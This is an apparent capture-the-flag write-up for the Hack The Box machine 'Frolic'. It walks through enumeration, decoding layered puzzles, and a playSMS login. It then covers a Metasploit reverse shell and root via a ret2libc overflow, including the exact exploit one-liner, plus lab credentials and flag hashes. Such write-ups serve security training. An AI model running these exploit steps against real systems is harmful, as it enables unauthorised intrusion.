# FROLIC
## Info

IP Address: 10.10.10.111  
OS: Linux  
Difficulty: Medium  

## System Enumeration

### NMAP
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicnmap.png "NMAP")

We see two different ports that we can access, `1880` and `9999`

### Port 1880: Node-RED service
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/frolicRED.png "RED Service")

### Port 9999: nginx service
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicnginx.png "NGINX")

## Enumerating Port 9999 with Dirbuster

I used the dirb wordlists `big.txt`
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicdirbuster.png "Dirbuster")

Looking up all areas with response code 200, which we can access without restrictions

### /admin/

#### Source Code 

##### /login.js/

username: admin
password: superduperlooperpassword_lol

```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.?
!.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? .....
..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?...
..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... .....
..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !....
..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!!
!!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?!
!.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.?
!!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!!
!!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!!
!!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?..
..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! .....
..!.! !!!!! !.?. 
```

A quick lookup shows that this is the Ook! language.
Using an online decoder, we achieve 
```
Nothing here check /asdiSIAJJ0QWE9JAS
```
Opening up `http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS` , we get:
```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB
BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs
K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3
h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj
lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC
AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
```

This looks like base64 encoding. Using `https://www.freeformatter.com/base64-encoder.html` and downloading the resulting zip, we see that its locked. Using fcrackzip to crack zip passwords, we get

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/froliczip.png "Locked Zip")
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicfcrack.png "FCrackZip")

Opening up `index.php`, we get
```
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b797367
4b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c53
30674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c543474
4c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046
302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```
which seems to be hex code, translating hex to ascii
```
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```
which is easily identified as base64, decoding this
```
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..< 
```
A quick google search shows that this is brainfuck, decoding which gets us a string `idkwhatispass`

This string did not work as password on the `RED` service so I tried enumerating again with a different wordlist, which gave me a new directory

### /playsms/
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysms.png "PlaySMS")
Using the username `admin` and password `idkwhatispass`, we logged in

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysmslogin.png "LoggedIn Playsms")

Using metasploit, I was able to gain a reverse shell through playsms service

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicplaysmsexploit.png "Metasploit")
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicshell.png "Reverse Shell")

## User Exposed
![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicuser.png "User")

Finally got user
`user.txt = 2ab95909cf509f85a6f476b59a0c2fe0`

## Privilege Escalation

Following simple steps to check for escalation, I first check for SUID binaries in the system which can be exploited to escalate privileges:

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicsuid.png "SUID rop found")

Finding `rop` means we can exploit it using ret2lib attack and gain root. Downloaded the binary to my local machine(by using the `download <file>` command in meterpreter) to debug it using gdb-peda.

### Using gdb-peda
Step 1: Creating a pattern of 100 characters
      `pattern_create 100`
      `AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL`
Step 2: Finding buffer limit using pattern offset.

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicpatternfound.png "Finding offset")

### Using libc-search

Step 1: Use `ldd rop` to find what library its using
Step 2: Add gcc library to $PATH, using `export PATH = /usr/lib/gcc/i686-linux-gnu/:/sbin:/bin:/usr/sbin:/usr/bin`
Step 3: Upload libc-search.c to server (https://0xdeadbeef.info/code/libc-search.c)
Step 4: `gcc libc-search.c -o libc-search -lc -ldl`
Step 5: Search for system, exit using -s 
Step 6: Search for /bin/sh using -p (set libbase using -b)

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/froliclibc.png "Libc Enumeration")

### Creating Payload
The addresses are converted to little endian.

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicadd.png "Address List")

Now, we simply create a python one-line payload to pass as our argument to the `rop` binary.
```
python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"'
```
### Root Obtained

Running
```
./rop $(python -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7"+"\x0b\x4a\xf7\xb7"')
```
We obtain root

![alt text](https://github.com/Gesundheit/HTB-Writeups/blob/master/boxImages/Frolic/frolicroot.png "Rooted")

`root.txt = 85d3fdf03f969892538ba9a731826222`
